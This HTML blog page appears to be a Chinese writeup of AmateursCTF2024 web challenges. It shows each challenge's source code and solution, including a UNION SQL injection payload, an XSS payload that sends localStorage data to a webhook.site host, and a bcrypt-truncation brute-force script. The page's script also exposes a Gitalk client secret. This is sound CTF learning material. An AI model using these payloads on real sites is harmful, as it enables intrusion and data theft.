@@ -1,0 +1,575 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>AmateursCTF2024 - Web - Writeup | fallingskies</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1724150366542">
+<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="denied
+index.js
+const express = require('express')
+const app = express()
+const port = 3000
+
+app.get('/', (req, res) =&gt..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://fallingskies22.github.io">
+        <img src="https://fallingskies22.github.io/images/avatar.png?v=1724150366542" class="site-logo">
+        <h1 class="site-title">fallingskies</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/post/friends" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      <h3>想要去月球<h3>
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">AmateursCTF2024 - Web - Writeup</h2>
+            <div class="post-date">2024-04-08</div>
+            
+            <div class="post-content" v-pre>
+              <h1 id="denied">denied</h1>
+<p>index.js</p>
+<pre><code class="language-js">const express = require('express')
+const app = express()
+const port = 3000
+
+app.get('/', (req, res) =&gt; {
+  if (req.method == &quot;GET&quot;) return res.send(&quot;Bad!&quot;);
+  res.cookie('flag', process.env.FLAG ?? &quot;flag{fake_flag}&quot;)
+  res.send('Winner!')
+})
+
+app.listen(port, () =&gt; {
+  console.log(`Example app listening on port ${port}`)
+})
+</code></pre>
+<p>使用OPTIONS方法，查看服务器支持方法。</p>
+<figure data-type="image" tabindex="1"><img src="https://fallingskies22.github.io/post-images/1712556654810.png" alt="" loading="lazy"></figure>
+<p>使用HEAD方法<br>
+<img src="https://fallingskies22.github.io/post-images/1712556664517.png" alt="" loading="lazy"></p>
+<p>得到flag<br>
+amateursCTF{s0_m@ny_0ptions...}</p>
+<h1 id="agile-rut">agile-rut</h1>
+<p>页面使用了自定义字体<br>
+<img src="https://fallingskies22.github.io/post-images/1712559856601.png" alt="" loading="lazy"></p>
+<p>使用<a href="https://tophix.com/zh-cn/font-tools/font-viewer">otf在线分析网站</a></p>
+<p>发现一个特殊的字符<br>
+<img src="https://fallingskies22.github.io/post-images/1712559921007.png" alt="" loading="lazy"></p>
+<p>但是不知道怎么将这个字符输入到网站中😂</p>
+<p>继续查看其他信息，查看<a href="https://learn.microsoft.com/zh-cn/typography/opentype/spec/gsub">Glyph Substitution Table - GSUB</a>部分<br>
+这个部分是进行一些字符替换的，主要是一些连字。<br>
+<img src="https://fallingskies22.github.io/post-images/1712560064021.png" alt="" loading="lazy"></p>
+<p>对照上面的字符表可以得到flag<br>
+amateursctf{0k_but_1_dont_like_the_jbmon0_===}</p>
+<pre><code class="language-python">str = [78,66,85,70,86,83,84,68,85,71,92,17,76,64,67,86,85,64,18,64,69,80,79,85,64,77,74,76,70,64,85,73,70,64,75,67,78,80,79,17,64,30,30,30,94]
+
+
+for i in str:
+    print(chr(i+31),end=&quot;&quot;)
+</code></pre>
+<p>使用字体编辑工具更方便<br>
+https://www.glyphrstudio.com/app/</p>
+<h1 id="one-shot">one-shot</h1>
+<p>查看源码，显然search处的query参数存在like型注入。</p>
+<pre><code class="language-python">from flask import Flask, request, make_response
+import sqlite3
+import os
+import re
+
+app = Flask(__name__)
+db = sqlite3.connect(&quot;:memory:&quot;, check_same_thread=False)
+flag = open(&quot;flag.txt&quot;).read()
+
+@app.route(&quot;/&quot;)
+def home():
+    return &quot;&quot;&quot;
+    &lt;h1&gt;You have one shot.&lt;/h1&gt;
+    &lt;form action=&quot;/new_session&quot; method=&quot;POST&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;New Session&quot;&gt;&lt;/form&gt;
+    &quot;&quot;&quot;
+
+@app.route(&quot;/new_session&quot;, methods=[&quot;POST&quot;])
+def new_session():
+    id = os.urandom(8).hex()
+    db.execute(f&quot;CREATE TABLE table_{id} (password TEXT, searched INTEGER)&quot;)
+    db.execute(f&quot;INSERT INTO table_{id} VALUES ('{os.urandom(16).hex()}', 0)&quot;)
+    res = make_response(f&quot;&quot;&quot;
+    &lt;h2&gt;Fragments scattered... Maybe a search will help?&lt;/h2&gt;
+    &lt;form action=&quot;/search&quot; method=&quot;POST&quot;&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;{id}&quot;&gt;
+        &lt;input type=&quot;text&quot; name=&quot;query&quot; value=&quot;&quot;&gt;
+        &lt;input type=&quot;submit&quot; value=&quot;Find&quot;&gt;
+    &lt;/form&gt;
+&quot;&quot;&quot;)
+    res.status = 201
+
+    return res
+
+@app.route(&quot;/search&quot;, methods=[&quot;POST&quot;])
+def search():
+    id = request.form[&quot;id&quot;]
+    if not re.match(&quot;[1234567890abcdef]{16}&quot;, id):
+        return &quot;invalid id&quot;
+    searched = db.execute(f&quot;SELECT searched FROM table_{id}&quot;).fetchone()[0]
+    if searched:
+        return &quot;you've used your shot.&quot;
+    
+    db.execute(f&quot;UPDATE table_{id} SET searched = 1&quot;)
+
+    query = db.execute(f&quot;SELECT password FROM table_{id} WHERE password LIKE '%{request.form['query']}%'&quot;)
+    return f&quot;&quot;&quot;
+    &lt;h2&gt;Your results:&lt;/h2&gt;
+    &lt;ul&gt;
+    {&quot;&quot;.join([f&quot;&lt;li&gt;{row[0][0] + '*' * (len(row[0]) - 1)}&lt;/li&gt;&quot; for row in query.fetchall()])}
+    &lt;/ul&gt;
+    &lt;h3&gt;Ready to make your guess?&lt;/h3&gt;
+    &lt;form action=&quot;/guess&quot; method=&quot;POST&quot;&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;{id}&quot;&gt;
+        &lt;input type=&quot;text&quot; name=&quot;password&quot; placehoder=&quot;Password&quot;&gt;
+        &lt;input type=&quot;submit&quot; value=&quot;Guess&quot;&gt;
+    &lt;/form&gt;
+&quot;&quot;&quot;
+
+@app.route(&quot;/guess&quot;, methods=[&quot;POST&quot;])
+def guess():
+    id = request.form[&quot;id&quot;]
+    if not re.match(&quot;[1234567890abcdef]{16}&quot;, id):
+        return &quot;invalid id&quot;
+    result = db.execute(f&quot;SELECT password FROM table_{id} WHERE password = ?&quot;, (request.form['password'],)).fetchone()
+    if result != None:
+        return flag
+    
+    db.execute(f&quot;DROP TABLE table_{id}&quot;)
+    return &quot;You failed. &lt;a href='/'&gt;Go back&lt;/a&gt;&quot;
+
+@app.errorhandler(500)
+def ise(error):
+    original = getattr(error, &quot;original_exception&quot;, None)
+    if type(original) == sqlite3.OperationalError and &quot;no such table&quot; in repr(original):
+        return &quot;that table is gone. &lt;a href='/'&gt;Go back&lt;/a&gt;&quot;
+    return &quot;Internal server error&quot;
+
+if __name__ == &quot;__main__&quot;:
+    app.run(host=&quot;0.0.0.0&quot;, port=8080)
+
+</code></pre>
+<p>只能查询一次，且查询结果只能显示第一个字符。<br>
+考虑使用union逐个字符查询。</p>
+<p>SQL测试脚本</p>
+<pre><code class="language-python">from flask import Flask, request, make_response
+import sqlite3
+import os
+import re
+
+
+db = sqlite3.connect(&quot;:memory:&quot;, check_same_thread=False)
+
+
+id = os.urandom(8).hex()
+print(id)
+db.execute(f&quot;CREATE TABLE table_{id} (password TEXT, searched INTEGER)&quot;)
+password = os.urandom(16).hex()
+print(password)
+db.execute(f&quot;INSERT INTO table_{id} VALUES ('{password}', 0)&quot;)
+
+# searched = db.execute(f&quot;SELECT searched FROM table_{id}&quot;).fetchone()[0]
+# if searched:
+#     print(&quot;you've used your shot.&quot;)
+
+#db.execute(f&quot;UPDATE table_{id} SET searched = 1&quot;)
+#id = &quot;7aa17ba42e9f1b51&quot;
+str = &quot;' &quot;
+for i in range(1,33):
+    str += f'''union all select substr(password,{i},1) from table_{id} '''
+str += &quot;--+&quot;
+
+print(str)
+
+#print(str)
+query = db.execute(f&quot;SELECT password FROM table_{id} WHERE password LIKE '%{str}%'&quot;)
+
+#print(query.fetchall())
+print({&quot;&quot;.join([f&quot;&lt;li&gt;{row[0][0] + '*' * (len(row[0]) - 1)}&lt;/li&gt;&quot; for row in query.fetchall()])})
+</code></pre>
+<p>payload如下：</p>
+<pre><code class="language-sql">' union all select substr(password,1,1) from table_7aa17ba42e9f1b51 union all select substr(password,2,1) from table_7aa17ba42e9f1b51 union all select substr(password,3,1) from table_7aa17ba42e9f1b51 union all select substr(password,4,1) from table_7aa17ba42e9f1b51 union all select substr(password,5,1) from table_7aa17ba42e9f1b51 union all select substr(password,6,1) from table_7aa17ba42e9f1b51 union all select substr(password,7,1) from table_7aa17ba42e9f1b51 union all select substr(password,8,1) from table_7aa17ba42e9f1b51 union all select substr(password,9,1) from table_7aa17ba42e9f1b51 union all select substr(password,10,1) from table_7aa17ba42e9f1b51 union all select substr(password,11,1) from table_7aa17ba42e9f1b51 union all select substr(password,12,1) from table_7aa17ba42e9f1b51 union all select substr(password,13,1) from table_7aa17ba42e9f1b51 union all select substr(password,14,1) from table_7aa17ba42e9f1b51 union all select substr(password,15,1) from table_7aa17ba42e9f1b51 union all select substr(password,16,1) from table_7aa17ba42e9f1b51 union all select substr(password,17,1) from table_7aa17ba42e9f1b51 union all select substr(password,18,1) from table_7aa17ba42e9f1b51 union all select substr(password,19,1) from table_7aa17ba42e9f1b51 union all select substr(password,20,1) from table_7aa17ba42e9f1b51 union all select substr(password,21,1) from table_7aa17ba42e9f1b51 union all select substr(password,22,1) from table_7aa17ba42e9f1b51 union all select substr(password,23,1) from table_7aa17ba42e9f1b51 union all select substr(password,24,1) from table_7aa17ba42e9f1b51 union all select substr(password,25,1) from table_7aa17ba42e9f1b51 union all select substr(password,26,1) from table_7aa17ba42e9f1b51 union all select substr(password,27,1) from table_7aa17ba42e9f1b51 union all select substr(password,28,1) from table_7aa17ba42e9f1b51 union all select substr(password,29,1) from table_7aa17ba42e9f1b51 union all select substr(password,30,1) from table_7aa17ba42e9f1b51 union all select substr(password,31,1) from table_7aa17ba42e9f1b51 union all select substr(password,32,1) from table_7aa17ba42e9f1b51 --+
+</code></pre>
+<p>成功&quot;猜对&quot;密码后得到flag</p>
+<h1 id="sculpture">sculpture</h1>
+<p>显然是一道XSS<br>
+查看index.html代码，引用了js的sculpt(https://skulpt.org/js/skulpt-stdlib.js)库，来解析python代码，调用turtle画图。（直接命令执行当然是不行的🤒）<br>
+通过示例代码发现可以使用print打印字符，并且成功触发xss。<br>
+通过code传参base64编码的参数，会自动通过runit函数执行code。</p>
+<p>这里使用<scirpt>标签触发不了，只有<img>标签可以。（具体原理不是很清楚🤕）<br>
+构造payload</p>
+<pre><code>print &quot;&lt;img src=x onerror=with(document)body.appendChild(document.createElement('script')).src=\&quot;https://webhook.site/994ac52a-3113-4bbe-89de-335f522dc194?id=\&quot;+localStorage.getItem('flag')&gt;&lt;/img&gt;&quot;
+</code></pre>
+<p>记得base64后urlencode，get传参时<code>+</code>会被当成空格。</p>
+<p>最终payload</p>
+<pre><code>https://amateurs-ctf-2024-sculpture-challenge.pages.dev/?code=cHJpbnQgIjxpbWcgc3JjPXggb25lcnJvcj13aXRoKGRvY3VtZW50KWJvZHkuYXBwZW5kQ2hpbGQoZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0JykpLnNyYz1cImh0dHBzOi8vd2ViaG9vay5zaXRlLzk5NGFjNTJhLTMxMTMtNGJiZS04OWRlLTMzNWY1MjJkYzE5ND9pZD1cIitsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnZmxhZycpPjwvaW1nPiI%3D
+</code></pre>
+<p>得到flag<br>
+amateursCTF{i_l0v3_wh3n_y0u_can_imp0rt_xss_v3ct0r}</p>
+<h1 id="creative-login-page-challenge">creative-login-page-challenge</h1>
+<ul>
+<li>bcrypt长度限制72字符</li>
+</ul>
+<p>一个java编写的登录页面</p>
+<pre><code class="language-java">package team.amateurs.loginpage;
+
+import jakarta.servlet.http.Cookie;
+import jakarta.servlet.http.HttpServletResponse;
+import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.boot.SpringApplication;
+import org.springframework.boot.autoconfigure.SpringBootApplication;
+import org.springframework.core.io.Resource;
+import org.springframework.core.io.ResourceLoader;
+import org.springframework.http.MediaType;
+import org.springframework.security.crypto.bcrypt.BCrypt;
+import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
+import org.springframework.web.bind.annotation.*;
+
+import javax.print.attribute.standard.Media;
+import java.io.IOException;
+import java.lang.reflect.Field;
+import java.nio.charset.Charset;
+import java.util.Base64;
+import java.util.HashMap;
+
+@SpringBootApplication
+@RestController
+public class LoginpageApplication {
+    HashMap&lt;String, String&gt; users = new HashMap&lt;String, String&gt;();
+    @Autowired
+    public ResourceLoader resourceLoader;
+    private final static String SALT = BCrypt.gensalt();
+    // Some fun things to include in your username/password!
+    // TODO take from env cause yes
+    public String flag = System.getenv(&quot;FLAG&quot;);
+    public String randomNum = Integer.toString((int) (Math.random() * 100));
+	// add more
+
+    public static void main(String[] args) {
+        SpringApplication.run(LoginpageApplication.class, args);
+    }
+
+    @GetMapping(&quot;/&quot;)
+    public String getRoot(HttpServletResponse response) {
+        try {
+            response.sendRedirect(&quot;/register&quot;);
+            return &quot;Redirecting&quot;;
+        } catch (Exception e) {
+            return e.getMessage();
+        }
+    }
+
+    @PostMapping(&quot;/register&quot;)
+    public String postRegister(HttpServletResponse response, @RequestParam(value = &quot;username&quot;) String username, @RequestParam(value = &quot;password&quot;) String password) {
+        try {
+            if (username.isEmpty() || password.isEmpty()) return &quot;No empty field&quot;;
+            String tUsername = template(username);
+            if (tUsername.contains(flag)) return &quot;No flag &gt;:( !&quot;;
+            String tPassword = template(password);
+            if (users.get(tUsername) != null) return &quot;Username already taken!&quot;;
+            users.put(tUsername, BCrypt.hashpw(tPassword, SALT));
+            Cookie usernameCookie = new Cookie(&quot;username&quot;, Base64.getEncoder().encodeToString(tUsername.getBytes()));
+            response.addCookie(usernameCookie);
+            // yeah, sue me
+            Cookie tokenCookie = new Cookie(&quot;token&quot;, BCrypt.hashpw(users.get(tUsername), SALT));
+            response.addCookie(tokenCookie);
+            response.sendRedirect(&quot;/hello&quot;);
+            return &quot;Redirecting&quot;;
+        } catch (Exception e) {
+            return e.getMessage();
+        }
+    }
+
+    @GetMapping(value = &quot;/register&quot;, produces = MediaType.TEXT_HTML_VALUE)
+    public String getRegister() throws IOException {
+        return resourceLoader.getResource(&quot;classpath:static/register.html&quot;).getContentAsString(Charset.defaultCharset());
+    }
+
+    @GetMapping(&quot;/hello&quot;)
+    public String getHello(HttpServletResponse response, @CookieValue(value = &quot;username&quot;, required = false) String username, @CookieValue(value = &quot;token&quot;, required = false) String token) throws IOException {
+        if (token == null || username == null) {
+            response.sendRedirect(&quot;/login&quot;);
+            return &quot;Redirecting&quot;;
+        }
+
+        String decodedName = new String(Base64.getDecoder().decode(username));
+
+        if (token.equals(BCrypt.hashpw(users.get(decodedName), SALT))) {
+            return &quot;Hello &quot; + decodedName;
+        } else {
+            response.sendRedirect(&quot;/login&quot;);
+            return &quot;Redirecting&quot;;
+        }
+    }
+
+    @PostMapping(&quot;/login&quot;)
+    public String postLogin(HttpServletResponse response, @RequestParam(value = &quot;username&quot;) String username, @RequestParam(value = &quot;password&quot;) String password) {
+        try {
+            String actual = users.get(username);
+            if (actual == null) return &quot;Credentials wrong&quot;;
+
+            String input = BCrypt.hashpw(password, SALT);
+            if (input.equalsIgnoreCase(actual)) {
+                Cookie usernameCookie = new Cookie(&quot;username&quot;, Base64.getEncoder().encodeToString(username.getBytes()));
+                response.addCookie(usernameCookie);
+                // yeah, sue me
+                Cookie tokenCookie = new Cookie(&quot;token&quot;, BCrypt.hashpw(actual, SALT));
+                response.addCookie(tokenCookie);
+
+                response.sendRedirect(&quot;/hello&quot;);
+                return &quot;Redirecting&quot;;
+            }
+            response.setStatus(401);
+			return &quot;Credentials wrong&quot;;
+        } catch (Exception e) {
+            return e.getMessage();
+        }
+    }
+
+    @GetMapping(value = &quot;/login&quot;, produces = MediaType.TEXT_HTML_VALUE)
+    public String getLogin() throws IOException {
+        return resourceLoader.getResource(&quot;classpath:static/login.html&quot;).getContentAsString(Charset.defaultCharset());
+    }
+
+
+    private String template(String fmtStr) throws Exception {
+        StringBuilder sb = new StringBuilder();
+        while (fmtStr.contains(&quot;{{&quot;)) {
+            int start = fmtStr.indexOf(&quot;{{&quot;) + 2;
+            int end = fmtStr.indexOf(&quot;}}&quot;, start);
+            if (end == -1) throw new Exception(&quot;Invalid Format String&quot;);
+            sb.append(fmtStr, 0, start - 2);
+            Field f = LoginpageApplication.class.getField(fmtStr.substring(start, end));
+            if (f.getType().equals(String.class)) {
+                sb.append(f.get(this));
+            } else {
+                throw new Exception(&quot;Field not found&quot;);
+            }
+
+            fmtStr = fmtStr.substring(end + 2);
+        }
+        // no format strings, no need.
+        sb.append(fmtStr);
+        return sb.toString();
+    }
+
+}
+</code></pre>
+<p>发现提供了template方法可以通过反射获取类中的字符类型变量，使用{{flag}}形式可以获取flag，但是username中不能包含flag，password中flag又不会显示。</p>
+<p>这里利用bcrypt的一个性质，密码长度限制为72，<a href="https://www.monterail.com/blog/more-secure-passwords-bcrypt">参考文章</a><br>
+例如下面的两个字符串，加密后结果是一样的。</p>
+<pre><code class="language-java">public static void main(String[] args) throws Exception {
+        String hash_1 = BCrypt.hashpw(&quot;passwordaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaac&quot;, SALT);
+        System.out.println(hash_1);
+        String hash_2 = BCrypt.hashpw(&quot;passwordaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab&quot;, SALT);
+        System.out.println(hash_2);
+    }
+// $2a$10$ZltXx90HXy8s3ipHXZ2ExeYovy5SQ9/R2ajCh7Vwp.1WnAhmYlMie
+</code></pre>
+<p>写一个python脚本，逐个字符爆破flag。</p>
+<pre><code class="language-python">import requests
+import string
+
+url = &quot;http://creative-login-page.amt.rs/register&quot;
+
+ascii_letters = string.printable
+
+flag = &quot;&quot;
+
+for i in range(70):
+    r = requests.session()
+    username = &quot;rabiit12&quot;*(i+1)
+    password = &quot;a&quot;*(71-i)+&quot;{{flag}}&quot;
+    print(password)
+    data = {
+        &quot;username&quot;:username,
+        &quot;password&quot;:password
+    }
+    response = r.post(url=url,data=data,allow_redirects=False)
+    token = response.cookies[&quot;token&quot;]
+    print(token)
+
+    for j in range(len(ascii_letters)):
+        r = requests.session()
+        username = (&quot;robots12&quot;+str(i))*(j+1)
+        password = &quot;a&quot;*(71-i)+flag+ascii_letters[j]
+        print(password)
+        data = {
+        &quot;username&quot;:username,
+        &quot;password&quot;:password
+        }
+        response = r.post(url=url,data=data,allow_redirects=False)
+        token2 = response.cookies[&quot;token&quot;]
+        print(token2)
+        if token2 == token:
+            flag += ascii_letters[j]
+            print(flag)
+            break
+</code></pre>
+<p>得到flag<br>
+amateursCTF{1_l0v3_l0gin_pAges}</p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://fallingskies22.github.io/post/ctfshowdai-ma-shen-ji/">
+                  <h3 class="post-title">
+                    [ctfshow]代码审计
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '1b08861b8ad19018640e',
+        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
+        repo: 'fallingskies22.github.io',
+        owner: 'fallingskies22',
+        admin: ['fallingskies22'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
